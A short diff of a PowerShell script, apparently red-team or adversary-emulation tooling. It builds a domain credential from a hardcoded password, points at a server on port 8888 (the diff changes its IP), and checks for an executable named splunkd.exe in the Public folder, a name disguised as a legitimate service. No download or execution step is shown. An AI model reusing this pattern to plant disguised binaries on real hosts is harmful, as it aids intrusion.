@@ -5,7 +5,7 @@ $NTLMHash = "Password12345"
 $SecureNTLMHash = ConvertTo-SecureString -String $NTLMHash -AsPlainText -Force
 $Credential = New-Object System.Management.Automation.PSCredential("$DomainName\$UserName", $SecureNTLMHash)
 
-$server = "http://10.0.0.20:8888"
+$server = "http://172.16.172.16:8888"
 $file = "C:\Users\Public\splunkd.exe"
 
 if (Test-Path $file) {
